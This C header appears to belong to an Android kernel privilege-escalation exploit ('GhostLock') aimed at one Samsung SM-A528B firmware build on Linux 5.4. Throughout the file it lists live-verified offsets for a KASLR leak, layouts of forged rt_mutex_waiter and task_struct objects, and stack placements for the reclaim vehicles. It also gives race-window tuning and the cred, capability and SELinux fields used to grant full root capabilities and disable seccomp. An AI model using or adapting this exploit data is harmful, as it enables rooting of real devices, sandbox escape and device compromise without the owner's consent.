/* targets/kmi/qgki-5.4.h -- facts shared by this kernel interface: Qualcomm
 * QGKI, Linux 5.4, VA_BITS=39, no CONFIG_DEBUG_INFO_BTF.
 *
 * The only build against this interface so far is
 * a52sxq-A528BXXSBGYI3.h (Samsung SM-A528B / "a52sxq"). Whether any of these
 * facts are shared by another QGKI 5.4 build, as opposed to being specific
 * to that one, is untested -- unlike android14-6.1.h/android15-6.6.h, which
 * cover many devices sharing a byte-identical GKI image, this interface has
 * exactly one build behind it. Treat every row here as build-specific until
 * a second build confirms otherwise.
 *
 * PIPE_INODE_OFF_NRBUFS/CURBUF/BUFFERS (not RING_SIZE/HEAD/TAIL) below
 * record that this kernel predates the pipe ring rewrite (Linux 5.5,
 * 8cefc107ca54). That shape is not a blocker: GhostLock's own pipe.c
 * find_pipe_buffer() locates the live struct pipe_buffer array purely by
 * its own content (a spray-time index marker written into each entry's
 * `len`, scanned back out of a reclaimed slab page) and lib_pipe_phys_read/
 * write() do one plain read()/write() syscall against a single already-
 * located entry. Neither ever dereferences pipe_inode_info's cursor fields,
 * on any kernel version -- those three rows are recorded because they were
 * cheap to derive alongside everything else, not because anything here
 * consumes them. (CVE-2026-43049/FFWheel's ffroot_w.c does read
 * PIPE_INODE_OFF_BUFS/HEAD/TAIL directly and would need this kernel's real
 * values if it were ever ported here; it has not been.)
 *
 * Everything else below -- struct layouts, the KASLR leak constant, the
 * reclaim-vehicle choice and its placement shift -- is independently
 * derived and, where noted, verified live on hardware.
 */
#ifndef TARGET_KMI_QGKI_5_4_H
#define TARGET_KMI_QGKI_5_4_H

#define TARGET_KMI_QGKI_5_4 1

/* ── Memory map (VA_BITS=39, 4K pages) ──
 * Same VA_BITS/page size/struct-page size as android14-6.1's interface, and
 * PAGE_OFFSET is a pure function of VA_BITS (arch/arm64/include/asm/memory.h:
 * PAGE_OFFSET = -(1<<VA_BITS)). VMEMMAP_START is emitted per Image by
 * tools/pixel-image/derive_offsets.py because the vmemmap layout belongs to
 * the kernel build, not the KMI. KIMAGE_TEXT_BASE is a per-build
 * link-time fact and is stated by the kernel-image header, not here. */
#ifndef P0_PAGE_OFFSET
#define P0_PAGE_OFFSET              0xffffff8000000000ULL
#endif
#ifndef DIRECT_MAP_BASE
#define DIRECT_MAP_BASE             0xffffff8000000000ULL
#endif
#ifndef DIRECT_MAP_END
#define DIRECT_MAP_END              0xffffff9000000000ULL
#endif

/* P0_KERNEL_PHYS_LOAD follows the same arm64 convention that ties the
 * physical load address to the virtual KASLR slide: /proc/iomem's "Kernel
 * code" physical start always equals this constant plus the tracefs-leaked
 * slide. The physical side therefore needs no runtime discovery of its
 * own -- the existing KASLR leak covers it through this one fixed
 * per-build constant.
 *
 * P0_PHYS_OFFSET is not re-derived on this device's own linear map; it
 * carries Pixel's value, on the arm64 convention that the physical delta
 * equals the virtual slide. */
#ifndef P0_PHYS_OFFSET
#define P0_PHYS_OFFSET              0x80000000ULL
#endif
#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD         0xa0080000ULL
#endif
/* The physical load moves with the virtual slide here (the lockstep the
 * comment above records), so the image's physmap alias is not the same address
 * every boot and every consumer has to name the slide -- see
 * P0_KERNEL_PHYS_TRACKS_SLIDE in cves/lib/rw/krw.h. The invariant is
 * checkable directly: reading a known symbol's slot through the
 * slide-corrected physical alias returns the genuine pointer, while the same
 * read through the uncorrected alias returns zero. */
#ifndef P0_KERNEL_PHYS_TRACKS_SLIDE
#define P0_KERNEL_PHYS_TRACKS_SLIDE 1
#endif

/* cves/lib/addr/physmap.h's own names for the same two facts (PHYS_OFFSET,
 * PAGE_OFFSET) -- no existing Pixel target ever states these explicitly,
 * because that file's fallback defaults already happen to be every Pixel
 * device's real values. They are not this device's automatically, so they
 * are stated here rather than left to that coincidence. */
#ifndef PHYS_OFFSET
#define PHYS_OFFSET                 P0_PHYS_OFFSET
#endif
#ifndef PAGE_OFFSET
#define PAGE_OFFSET                 P0_PAGE_OFFSET
#endif
#ifndef KERNELSNITCH_IDENTITY_START
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#endif
#ifndef KERNELSNITCH_IDENTITY_END
#define KERNELSNITCH_IDENTITY_END   0xffffff9000000000ULL
#endif
#ifndef VA_BITS
#define VA_BITS                     39
#endif
_Static_assert((0ULL - P0_PAGE_OFFSET) == (1ULL << VA_BITS),
               "VA_BITS disagrees with P0_PAGE_OFFSET");

/* ── Reclaim vehicle ──
 * bpf is the only vehicle whose gate passes on this build -- see
 * BPF_WAITER_OFF below for its placement. Everything else below is
 * unusable; tcp-zc is unusable, not merely undefaulted: this kernel's
 * struct tcp_zerocopy_receive is still the pre-7eeba1706eba 3-field/
 * 16-byte shape (address/length/recv_skip_hint; confirmed by reading
 * include/uapi/linux/tcp.h in this source tree). The msg_control/
 * msg_controllen words the vehicle writes the waiter's task/lock pointers
 * through do not exist -- do_tcp_getsockopt() truncates the copy and echoes
 * the shorter length, per GhostLock's own README ("a certain panic, no
 * tunable that helps").
 *
 * pselect is unusable: with PSELECT_WAITER_WORD_SHIFT=13 below, every
 * forged-waiter word (words 2-12) falls outside the [0, 3*words_per_set-1]
 * range pselect_put_global_word() can place at all, so the placement call
 * refuses every word of the waiter.
 *
 * sigreturn is unusable too: -216 (SIGRETURN_WAITER_OFF below) is outside
 * its own placement window -- REFUSE-gated; see that row.
 *
 * clone3 is unusable too: -208 (CLONE3_WAITER_OFF below) misses its own
 * exact-match requirement by a wide margin, and separately this build's own
 * struct clone_args is the older 64-byte shape (no set_tid/set_tid_size/
 * cgroup) that fops_clone3.c's local mirror does not match anyway -- REFUSE
 * either way.
 *
 * process-vm is unusable too: -64 (PROCESS_VM_WAITER_OFF below) is outside
 * its own placement window -- REFUSE-gated; see that row. This kernel's
 * process_vm_rw() is structurally different from android14-6.1's/
 * android15-6.6's own (still calls the older rw_copy_check_uvector(), not
 * iovec_from_user()), so PROCESS_VM_WAITER_OFF was independently re-derived
 * against this build's own Image rather than assumed to match either Pixel
 * KMI.
 *
 * No preference stated: derivation falls through to the best-ranked
 * OK-class vehicle, which is bpf. */
/* The pselect placement shift: derived from this build's own disassembly
 * (the 4-hop __arm64_sys_pselect6 -> __do_sys_pselect6 [do_pselect inlined]
 * -> core_sys_select() call chain, its stack-frame sizes, and two
 * independent witness call sites for the waiter slot agreeing exactly),
 * cross-verified against live hardware disassembly, not carried from
 * android14-6.1's value (1) -- this build's compiler output places the
 * frame differently. Kept as a real, measured fact even though it places the
 * vehicle out of window (see above) -- see tools/kernel-source-offsets/ and
 * cves/targets/kernel/a52sxq-A528BXXSBGYI3.h for how the code/stack rules
 * that produced this were themselves verified. */
#ifndef PSELECT_WAITER_WORD_SHIFT
#define PSELECT_WAITER_WORD_SHIFT   13
#endif

/* Derived from a live A528BXXSBGYI3 boot.img (extracted with
 * runner/scripts/lib/boot_image.py into data/live/a52sxq-A528BXXSBGYI3/Image,
 * the [STACKMAP] stack-bytes-sigreturn rule -- runner/scripts/lib/
 * offset_rules.py's _sigreturn_delta()): unlike android14-6.1/android15-6.6,
 * this 5.4 kernel keeps restore_fpsimd_context as a real, uninlined
 * function with exactly one __arch_copy_from_user call in it -- no
 * sequence disambiguation needed. But restore_fpsimd_context's own stack
 * use is NOT monotonic either: a `sub sp,sp,#0x220` opened early is given
 * back with a matching `add sp,sp,#0x220` BEFORE the fpsimd copy this
 * vehicle targets is ever reached, so the copy's own live sp is shallower
 * than the function's peak -- confirmed by disassembly, not inferred (the
 * same bug class __arm64_sys_rt_sigreturn's own inlined shape has;
 * _depth_tracked_witness_slot() in offset_rules.py fixes both).
 * futex_wait_requeue_pi's real waiter slot is at sp+0x98 via
 * rt_mutex_wait_proxy_lock. -216 is the corrected byte delta; it is outside
 * the [0, SIGRETURN_VREGS_BYTES - FAKE_WAITER_LAYOUT_SIZE] = [0, 416]
 * window a forged waiter needs to fit in, so this vehicle's own
 * SIGRETURN_WAITER_OFF_GATE_FAIL refuses it on this build. */
#ifndef SIGRETURN_WAITER_OFF
#define SIGRETURN_WAITER_OFF        (-216)
#endif

/* Derived from a live A528BXXSBGYI3 boot.img (data/live/
 * a52sxq-A528BXXSBGYI3/Image, the [STACKMAP] stack-bytes-clone3 rule --
 * runner/scripts/lib/offset_rules.py's chain_slot_delta() over
 * _CLONE3_CHAIN/_CLONE3_WITNESSES); confirmed by re-running
 * derive_offsets.py against this same Image, which reproduces -208
 * exactly. copy_clone_args_from_user() has no non-monotonic-stack hazard
 * the way __arm64_sys_rt_sigreturn's inlined shape does, so this is an
 * ordinary chain_slot_delta() witness search, not a depth-tracked one.
 *
 * -208 places the forged waiter's task field at buf-160 and lock at buf-152
 * (this interface's FAKE_WAITER_TASK_OFF/LOCK_OFF, 0x30/0x38, below) --
 * both BEFORE byte 0 of the copy destination, not merely outside the
 * window the sigreturn vehicle's own gate checks: this build's real
 * futex-waiter stack slot sits entirely before copy_clone_args_from_user's
 * own struct clone_args buffer even starts, so this vehicle's narrow
 * two-field write cannot reach it at any offset. A genuine geometric miss,
 * not a derivation failure -- clone3_gate_check() (fops_clone3.c) refuses
 * it, the same REFUSE-gated-but-real-fact treatment as SIGRETURN_WAITER_OFF
 * above. This build's own struct clone_args is also the older 64-byte
 * shape (confirmed by disassembly, `mov w2,#0x40` sizing the copy) rather
 * than the 88-byte one fops_clone3.c's local struct mirrors, which would
 * matter if this vehicle ever fired here -- it never does, since the gate
 * refuses first. */
#ifndef CLONE3_WAITER_OFF
#define CLONE3_WAITER_OFF           (-208)
#endif

/* Derived from a live A528BXXSBGYI3 boot.img (data/live/a52sxq-A528BXXSBGYI3/
 * Image, the [STACKMAP] stack-bytes-process-vm rule -- runner/scripts/lib/
 * offset_rules.py's chain_slot_delta() over _PROCESS_VM_CHAIN/
 * _PROCESS_VM_WITNESSES): this 5.4 kernel's process_vm_rw() still calls the
 * older rw_copy_check_uvector() (fast_pointer is a direct argument, index
 * 4, same as android14-6.1's newer iovec_from_user() call -- no out-param
 * indirection on either kernel age). futex_wait_requeue_pi's real waiter
 * slot is at sp+0x98 via rt_mutex_wait_proxy_lock, the remote-iovec fast
 * array lands at sp+0x38 -- -64 is outside the [0,
 * PROCESS_VM_IOVSTACK_BYTES - FAKE_WAITER_LAYOUT_SIZE] = [0, 32] window a
 * forged waiter needs to fit in (too shallow), so this vehicle's own
 * PROCESS_VM_WAITER_OFF_GATE_FAIL refuses it on this build. */
#ifndef PROCESS_VM_WAITER_OFF
#define PROCESS_VM_WAITER_OFF       (-64)
#endif

/* Derived from a live A528BXXSBGYI3 boot.img (data/live/a52sxq-A528BXXSBGYI3/
 * Image, the [STACKMAP] stack-bytes-bpf rule -- runner/scripts/lib/
 * offset_rules.py's _bpf_delta()/chain_slot_delta() over _BPF_CHAIN_OLD/
 * _BPF_WITNESSES): this 5.4 kernel keeps __do_sys_bpf as a real, separate
 * function (__sys_bpf itself absent from kallsyms -- __arm64_sys_bpf calls
 * __do_sys_bpf directly), whose copy goes through a per-TU
 * "_copy_from_user" clone at file offset 0x92538, confirmed by disassembly
 * to be a real duplicate-named clone (needs load_duplicate_addrs() first --
 * see _BPF_WITNESSES' own comment) rather than the single address `syms`
 * would otherwise keep. futex_wait_requeue_pi's real waiter slot is at
 * sp+0x98 via rt_mutex_wait_proxy_lock, __do_sys_bpf's own `union bpf_attr
 * attr` lands at sp+0x10 via that clone. -40 places task/lock at buffer
 * offsets 8/16, both inside [0, BPF_ATTR_BYTES - 8] = [0, 104] -- this is
 * the ONE reclaim vehicle confirmed to actually fit on this build.
 * bpf_gate_check() (fops_bpf.c) passes. This kernel's own sizeof(union
 * bpf_attr) for BPF_MAP_CREATE-relevant fields is 112 bytes (`mov w2,
 * #0x70` sizing the copy, disassembly-confirmed), matching BPF_ATTR_BYTES
 * (common.h) exactly -- not a coincidence, that constant is this build's
 * own real size. With /proc/sys/kernel/unprivileged_bpf_disabled=0, an
 * unprivileged bpf(BPF_MAP_CREATE) call returns EPERM with no AVC denial
 * logged: security_bpf()'s own LSM hook runs and denies the call AFTER
 * copy_from_bpfptr()'s copy has already completed, matching the
 * instruction order in __do_sys_bpf's disassembly, where the copy call
 * precedes the security_bpf() call. */
#ifndef BPF_WAITER_OFF
#define BPF_WAITER_OFF              (-40)
#endif

/* Derived from a live A528BXXSBGYI3 Image + kallsyms (the [STACKMAP]
 * stack-bytes-mcast rule -- offset_rules.py's _mcast_delta()): the futex waiter
 * is at sp+0x98 via rt_mutex_wait_proxy_lock, do_ip_setsockopt's own 264-byte
 * struct group_source_req at sp+0x20. +216 covers the waiter's rb_node children
 * (buffer 224/232, so rb_erase is survivable) but task/lock land at buffer
 * 264/272 -- just past the 264-byte end -- so the bridge cannot be completed in
 * one copy and mcast_gate_check() (fops_mcast.c) refuses it ([0, 200]).
 * Verified value, unusable vehicle here. */
#ifndef MCAST_WAITER_OFF
#define MCAST_WAITER_OFF           216
#endif

/* Derived from a live A528BXXSBGYI3 Image + kallsyms (offset_rules.py's
 * stack-bytes-sockopt rule): sock_setsockopt's vendor SOL_SOCKET option 1000
 * copies up to 254 user bytes into a 255-byte stack buffer at sp+0x20 (memset
 * then copy_from_user, before any gate). The futex waiter is at sp+0x98 via
 * rt_mutex_wait_proxy_lock; +88 places task at buffer 0x88 and lock at 0x90,
 * both inside the 254-byte copy, and the rb_node children (buffer 0x60/0x68)
 * are zeroed by the buffer's own memset. In window and fails clean; the option
 * is a Samsung extension absent on the Pixel interfaces, so only this KMI
 * states a measured value. */
#ifndef SOCKOPT_WAITER_OFF
#define SOCKOPT_WAITER_OFF         88
#endif

/* ── Walk bisect points ──
 * Offsets into rt_mutex_adjust_prio_chain() on this build, for the monitor's
 * narrow probe set (MONITOR_PROBE_SET=1). Each one is the first instruction
 * past a gate the walk has to clear, so the counts say how far a walk got
 * rather than only that one happened. Read off this build's own disassembly:
 *
 *   +0x12c  past the trylock on the forged waiter's lock
 *   +0x14c  requeue path entered: reading lock->waiters.rb_leftmost
 *   +0x25c  past rt_mutex_top_waiter's BUG_ON, into the requeue proper
 *   +0x384  past the requeue, reading lock->owner
 *   +0x3e8  the owner's pi_lock taken
 *   +0x460  rt_mutex_dequeue_pi entered
 *   +0x494  the rb_erase that carries the write
 */
/* The entry gate, split into its two refusals. rt_mutex_adjust_pi() leaves
 * without walking when the dangling pointer is gone, and again when the forged
 * waiter's priority matches the task's; both exits are the same instruction, so
 * only a probe before each test tells them apart.
 *
 *   +0x30  the dangling pointer was still there (past the NULL test)
 *   +0x54  the early-return path: the gate refused
 *   +0x60  past the gate, about to read waiter->lock and walk
 *
 * Alongside them the two functions that decide whether there is anything to
 * walk at all: the proxy lock that sets the waiting task's pi_blocked_on, and
 * the rollback that clears it. The rollback clears CURRENT's, so one call is
 * the requeuer undoing its own and the bug's pointer survives; a second call
 * from the waiting task itself is that task clearing the pointer the chain was
 * going to use.
 */
/* Which deadlock the trigger produced.
 *
 * The dangling pointer exists only when task_blocks_on_rt_mutex() got far
 * enough to store it. That function refuses twice, and both refusals return
 * -EDEADLK to the same caller, so the requeue's own errno cannot tell them
 * apart: the early one (`owner == task`, +0xd8, `mov w20,#-35`) returns before
 * the store and leaves nothing behind, and the chain-walk one returns after it
 * and leaves the pointer this chain is built on.
 *
 *   +0xd8   the early refusal: no pointer was ever set
 *   +0x110  `task->pi_blocked_on = waiter` -- the pointer exists
 */
#ifndef MONITOR_PROBES_TRIGGER
#define MONITOR_PROBES_TRIGGER \
  "__rt_mutex_start_proxy_lock," \
  "task_blocks_on_rt_mutex," \
  "task_blocks_on_rt_mutex+0xd8," \
  "task_blocks_on_rt_mutex+0x110," \
  "remove_waiter," \
  "rt_mutex_adjust_pi+0x30"
#endif

#ifndef MONITOR_PROBES_GATE0
#define MONITOR_PROBES_GATE0 \
  "rt_mutex_adjust_pi," \
  "rt_mutex_adjust_pi+0x30," \
  "rt_mutex_adjust_pi+0x54," \
  "rt_mutex_adjust_pi+0x60," \
  "__rt_mutex_start_proxy_lock," \
  "remove_waiter"
#endif

/* The requeue section, rung by rung. The walk reaching +0x25c proves the
 * placed page is present and shaped; what remains is the stretch between that
 * and the store, and these are the gates in it.
 *
 *   +0x25c  past the top-waiter BUG_ON, into rt_mutex_dequeue/enqueue
 *   +0x460  rt_mutex_dequeue_pi entered
 *   +0x494  the rb_erase that carries the write
 *
 * Three points, not five. A breakpoint in this function traps on every
 * priority-inheritance walk the whole system makes, and the trap runs while
 * the walk holds a pi_lock; the sets that leave the machine alive keep at most
 * a few. +0x384 and +0x3e8 sit between these and are reachable by bisection
 * from what these three report, which costs a second run rather than a device.
 */
#ifndef MONITOR_PROBES_REQUEUE
#define MONITOR_PROBES_REQUEUE \
  "rt_mutex_adjust_pi+0x60," \
  "rt_mutex_adjust_prio_chain+0x25c," \
  "rt_mutex_adjust_prio_chain+0x460," \
  "rt_mutex_adjust_prio_chain+0x494"
#endif

#ifndef MONITOR_PROBES_WALK
#define MONITOR_PROBES_WALK \
  "rt_mutex_adjust_pi+0x60," \
  "rt_mutex_adjust_prio_chain," \
  "rt_mutex_adjust_prio_chain+0x12c," \
  "rt_mutex_adjust_prio_chain+0x14c," \
  "rt_mutex_adjust_prio_chain+0x25c," \
  "rt_mutex_adjust_prio_chain+0x494"
#endif

/* ── GhostLock race shape ──
 * Tuned on this device and stated here so a run does not have to carry them.
 *
 * The sockopt vehicle's overlay lives only while its copy_from_user is stalled
 * against a punched page, so the consumer is gated on that call still being in
 * progress: an ungated fire on this build walks stack bytes the overlay no
 * longer occupies, which ends the boot instead of the attempt. The gate's own
 * wait has to cover the punch it is waiting for.
 *
 * The stall region is what sets the window's width: a copy costs 5-13us, so
 * at 512K the whole punch finishes before any fire can stall, while at 16M
 * the punch outlasts enough copies that two thirds to four fifths of fires
 * stall, for milliseconds.
 * One-shot punching is what makes 16M affordable -- free-running, a fill of
 * the region every period takes this device down before the route reaches its
 * first armed fire.
 */
/* The in-call handshake supersedes the /proc state gate here: it waits on the
 * placing thread's own signal that the call is still in progress, where the
 * /proc gate samples a state and then acts tens of microseconds later -- most
 * of a short stall. Leaving both on would spend the window this one just
 * caught, so the sampling gate is off. */
#ifndef CONSUMER_WCHAN_GATE
#define CONSUMER_WCHAN_GATE         0
#endif
#ifndef CONSUMER_GATE_WAIT_USEC
#define CONSUMER_GATE_WAIT_USEC     20000
#endif
#ifndef SOCKOPT_STALL_MAP_LEN
#define SOCKOPT_STALL_MAP_LEN       (16 * 1024 * 1024)
#endif

/* ── configfs buffer descriptor ──
 * Independently derived from this build's own struct configfs_buffer
 * (fs/configfs/file.c) -- differs from android14-6.1's defaults past
 * CFG_PAGE_OFF (that interface's `struct mutex` inside configfs_buffer is
 * evidently a different size on this build/config; not investigated
 * further, since deriving directly made the question moot). See
 * tools/kernel-source-offsets/ for the derivation. */
#ifndef CFG_PAGE_OFF
#define CFG_PAGE_OFF                0x10
#endif
#ifndef CFG_NEEDS_READ_FILL_OFF
#define CFG_NEEDS_READ_FILL_OFF     0x40
#endif
#ifndef CFG_BIN_BUFFER_OFF
#define CFG_BIN_BUFFER_OFF          0x48
#endif
#ifndef CFG_BIN_BUFFER_SIZE_OFF
#define CFG_BIN_BUFFER_SIZE_OFF     0x50
#endif
#ifndef CFG_CB_MAX_SIZE_OFF
#define CFG_CB_MAX_SIZE_OFF         0x54
#endif
/* This kernel predates the configfs iter-ops conversion (5.13): it exposes
 * configfs_read_bin_file/configfs_write_bin_file (the .read/.write slot),
 * not configfs_read_iter/configfs_bin_write_iter. Confirmed by symbol
 * presence, not assumed from the kernel version -- see
 * a52sxq-A528BXXSBGYI3.h's CONFIGFS_READ_ITER_OFF/CONFIGFS_BIN_WRITE_ITER_OFF
 * comment. */
/* The .write slot here is configfs_write_file, which copies into the
 * descriptor's page and then calls flush_write_buffer() on the file's own
 * dentry -- an ashmem dentry with no d_fsdata, so that call faults: a NULL
 * dereference at offset 0x50, inside configfs_write_file+0xb0. The copy runs
 * first and its return value is the branch, so the write is issued through
 * an unmapped tail; see LIB_NAMEBLOB_WRITE_PAGE in cves/lib/rw/nameblob.h. */
#ifndef LIB_NAMEBLOB_WRITE_PAGE
#define LIB_NAMEBLOB_WRITE_PAGE     1
#endif

#ifndef CONFIGFS_RW_SLOT_READ
#define CONFIGFS_RW_SLOT_READ       1
#endif

/* ── Fabricated rt_mutex_waiter ──
 * Independently derived (tools/kernel-source-offsets/, against this
 * kernel's actual kernel/locking/rtmutex_common.h). This struct predates
 * the wake_state/ww_ctx fields (wound-wait mutex support, added well after
 * 5.4): tree_entry, pi_tree_entry, task, lock, prio, deadline is the whole
 * struct (0x50 bytes; CONFIG_DEBUG_RT_MUTEXES is not set, so no extra
 * fields between lock and prio either). One shared prio/deadline pair for
 * both tree views, same as android14-6.1's interface, but at different byte
 * offsets (no wake_state field ahead of them to push prio/deadline out).
 * FAKE_WAITER_WAKE_STATE_OFF/WW_CTX_OFF: fields this struct does not have,
 * and the kernel's own PI-unlink code path (remove_waiter() and what it
 * calls) never reads regardless of kernel version -- they're ww_mutex-only
 * fields. Placed past the real struct's end (0x50) so the write lands in
 * harmless page scratch rather than colliding with prio/deadline. */
#ifndef FAKE_WAITER_TREE_PRIO_OFF
#define FAKE_WAITER_TREE_PRIO_OFF        0x40
#endif
#ifndef FAKE_WAITER_TREE_DEADLINE_OFF
#define FAKE_WAITER_TREE_DEADLINE_OFF    0x48
#endif
#ifndef FAKE_WAITER_PI_TREE_ENTRY_OFF
#define FAKE_WAITER_PI_TREE_ENTRY_OFF    0x18
#endif
#ifndef FAKE_WAITER_PI_TREE_PRIO_OFF
#define FAKE_WAITER_PI_TREE_PRIO_OFF     0x40
#endif
#ifndef FAKE_WAITER_PI_TREE_DEADLINE_OFF
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#endif
#ifndef FAKE_WAITER_TASK_OFF
#define FAKE_WAITER_TASK_OFF             0x30
#endif
#ifndef FAKE_WAITER_LOCK_OFF
#define FAKE_WAITER_LOCK_OFF             0x38
#endif
#ifndef FAKE_WAITER_WAKE_STATE_OFF
#define FAKE_WAITER_WAKE_STATE_OFF       0x50
#endif
#ifndef FAKE_WAITER_WW_CTX_OFF
#define FAKE_WAITER_WW_CTX_OFF           0x58
#endif

/* ── Fabricated task_struct ──
 * Independently derived. */
#ifndef FAKE_TASK_USAGE_OFF
#define FAKE_TASK_USAGE_OFF         0x38
#endif
#ifndef FAKE_TASK_PRIO_OFF
#define FAKE_TASK_PRIO_OFF          0x7c
#endif
#ifndef FAKE_TASK_NORMAL_PRIO_OFF
#define FAKE_TASK_NORMAL_PRIO_OFF   0x84
#endif
#ifndef FAKE_TASK_TASK_GROUP_OFF
#define FAKE_TASK_TASK_GROUP_OFF    0x3d8
#endif
#ifndef FAKE_TASK_PI_LOCK_OFF
#define FAKE_TASK_PI_LOCK_OFF       0x8dc
#endif
#ifndef FAKE_TASK_PI_WAITERS_OFF
#define FAKE_TASK_PI_WAITERS_OFF    0x8e8
#endif
#ifndef FAKE_TASK_PI_TOP_TASK_OFF
#define FAKE_TASK_PI_TOP_TASK_OFF   0x8f8
#endif
#ifndef FAKE_TASK_PI_BLOCKED_ON_OFF
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x900
#endif

/* ── task_struct ──
 * TASK_TASKS_OFF, TASK_ATOMIC_FLAGS_OFF, TASK_PID_OFF, TASK_TGID_OFF,
 * TASK_THREAD_GROUP_OFF, TASK_REAL_CRED_OFF, TASK_CRED_OFF, TASK_COMM_OFF
 * and TASK_SECCOMP_OFF below all match tools/pixel-image/derive_offsets.py
 * --vmlinux (pahole_offsets.py, over DWARF) against a vmlinux built from
 * this same source and banner -- this kernel has no BTF of its own to read
 * a struct layout from directly. */
#ifndef TASK_PID_OFF
#define TASK_PID_OFF                0x650
#endif
#ifndef TASK_TGID_OFF
#define TASK_TGID_OFF               0x654
#endif
#ifndef TASK_REAL_PARENT_OFF
#define TASK_REAL_PARENT_OFF        0x660
#endif
#ifndef TASK_REAL_CRED_OFF
#define TASK_REAL_CRED_OFF          0x800
#endif
#ifndef TASK_CRED_OFF
#define TASK_CRED_OFF               0x808
#endif
#ifndef TASK_COMM_OFF
#define TASK_COMM_OFF               0x818
#endif
#ifndef TASK_TASKS_OFF
#define TASK_TASKS_OFF              0x550
#endif
/* task_struct.thread_group: the list_head linking every thread of a
 * thread group (leader included). Walked to reach a non-leader pthread,
 * which init_task.tasks -- leaders only -- does not link. */
#ifndef TASK_THREAD_GROUP_OFF
#define TASK_THREAD_GROUP_OFF       0x700
#endif
/* task_struct.policy and task_struct.dl.deadline. task->prio is
 * FAKE_TASK_PRIO_OFF. Together they are the inputs rt_mutex_adjust_pi's
 * rt_mutex_waiter_equal() compares against the (forged) waiter to decide
 * whether the pi-chain walk runs at all -- read by the vehicle monitor so a
 * run states whether the walk's early-out gate was open. */
#ifndef TASK_POLICY_OFF
#define TASK_POLICY_OFF             0x4d8
#endif
#ifndef TASK_DL_DEADLINE_OFF
#define TASK_DL_DEADLINE_OFF        0x428
#endif
/* task_struct.stack (kernel stack base) and the switched-out register context
 * task->thread.cpu_context.sp -- for a sleeping task, sp bounds the live part
 * of its kernel stack, whose bytes carry the forged waiter and saved state. */
#ifndef TASK_STACK_OFF
#define TASK_STACK_OFF              0x30
#endif
#ifndef TASK_CPU_CONTEXT_SP_OFF
#define TASK_CPU_CONTEXT_SP_OFF     0xbd8
#endif
#ifndef TASK_THREAD_INFO_FLAGS_OFF
#define TASK_THREAD_INFO_FLAGS_OFF  0x00
#endif
#ifndef TASK_SECCOMP_OFF
#define TASK_SECCOMP_OFF            0x8b8
#endif
#ifndef TASK_ATOMIC_FLAGS_OFF
#define TASK_ATOMIC_FLAGS_OFF       0x618
#endif
#ifndef TASK_GROUP_LEADER_OFF
#define TASK_GROUP_LEADER_OFF       0x690
#endif
#ifndef TASK_FILES_OFF
#define TASK_FILES_OFF              0x838
#endif
#ifndef TASK_COMM_LEN
#define TASK_COMM_LEN               16
#endif

/* ── cred and its security blob ──
 * SELINUX_CRED_BLOB_OFF's compile-time value is inert, not a fixed interface
 * constant: root.c's install_android_root() overwrites
 * `selinux_cred_blob_off` from this build's own live
 * selinux_blob_sizes.lbs_cred (`krw_read32(rw, kd_image(SELINUX_BLOB_SIZES))`)
 * before ever using it, because this kernel DOES use the shared-LSM-blob
 * model despite predating it upstream: security/selinux/include/objsec.h
 * defines selinux_cred() as `cred->security + selinux_blob_sizes.lbs_cred`,
 * confirmed by reading this kernel's own source (apparently backported
 * ahead of its Linux version, plausibly for a multi-LSM vendor security
 * stack). 0 here (same as android14-6.1's default) is never actually read
 * as an address -- it only has to exist so the static initializer
 * compiles. */
#ifndef SELINUX_CRED_BLOB_OFF
#define SELINUX_CRED_BLOB_OFF       0
#endif
/* CRED_UID_OFF, CRED_SECUREBITS_OFF, CRED_CAPS_OFF, CRED_SECURITY_OFF and
 * CRED_SIZE all match the same derive_offsets.py --vmlinux run noted above
 * for struct cred. See a52sxq-A528BXXSBGYI3.h for why a correct offset is
 * not sufficient on its own for this device. */
#ifndef CRED_UID_OFF
#define CRED_UID_OFF                0x4
#endif
#ifndef CRED_SECUREBITS_OFF
#define CRED_SECUREBITS_OFF         0x24
#endif
#ifndef CRED_CAPS_OFF
#define CRED_CAPS_OFF               0x28
#endif
#ifndef CRED_SECURITY_OFF
#define CRED_SECURITY_OFF           0x78
#endif
#ifndef SELINUX_CRED_OSID_OFF
#define SELINUX_CRED_OSID_OFF       0
#endif
#ifndef SELINUX_CRED_SID_OFF
#define SELINUX_CRED_SID_OFF        4
#endif
#ifndef CRED_USAGE_OFF
#define CRED_USAGE_OFF              0x00
#endif
#ifndef CRED_USER_OFF
#define CRED_USER_OFF               0x80
#endif
#ifndef CRED_USER_NS_OFF
#define CRED_USER_NS_OFF            0x88
#endif
#ifndef CRED_GROUP_INFO_OFF
#define CRED_GROUP_INFO_OFF         0x90
#endif
#ifndef CRED_SIZE
#define CRED_SIZE                   0xa8
#endif

/* ── Capability sets ──
 * Same 5-word layout/order as android14-6.1's interface (inheritable,
 * permitted, effective, bset, ambient from CRED_CAPS_OFF); independently
 * confirmed by the same field-offset derivation, all 8 bytes apart starting
 * at CRED_CAPS_OFF. */
#ifndef CRED_CAP_WORDS
#define CRED_CAP_WORDS              5
#endif
#ifndef CRED_CAP_INHERITABLE
#define CRED_CAP_INHERITABLE        0
#endif
#ifndef CRED_CAP_PERMITTED
#define CRED_CAP_PERMITTED          1
#endif
#ifndef CRED_CAP_EFFECTIVE
#define CRED_CAP_EFFECTIVE          2
#endif
#ifndef CRED_CAP_BSET
#define CRED_CAP_BSET               3
#endif
#ifndef CRED_CAP_AMBIENT
#define CRED_CAP_AMBIENT            4
#endif
#ifndef CAP_FULL
#define CAP_FULL                    0x000001ffffffffffULL
#endif
#ifndef CRED_CAP_OFF
#define CRED_CAP_OFF(which)         (CRED_CAPS_OFF + (which) * 8)
#endif
#ifndef SELINUX_KERNEL_SID
#define SELINUX_KERNEL_SID          1
#endif

/* ── seccomp ──
 * struct seccomp on this kernel is only { int mode; struct seccomp_filter
 * *filter; } -- confirmed by reading include/linux/seccomp.h in this source
 * tree -- with no filter-count field at all (added to the struct by a later
 * kernel than this one). SECCOMP_FILTER_COUNT_OFF is not a real field here:
 * it names the 4 bytes of alignment padding between mode (0-4) and filter
 * (8-16, independently confirmed by SECCOMP_FILTER_OFF below), which
 * lib_patch_task_seccomp() zeroes and reads back as part of disabling
 * seccomp. Writing/reading zero into padding is harmless and the pointer
 * write at SECCOMP_FILTER_OFF zeroes the field that actually matters
 * regardless, so this is a deliberate scratch placement, not a guess at a
 * field that does not exist. */
#ifndef SECCOMP_MODE_OFF
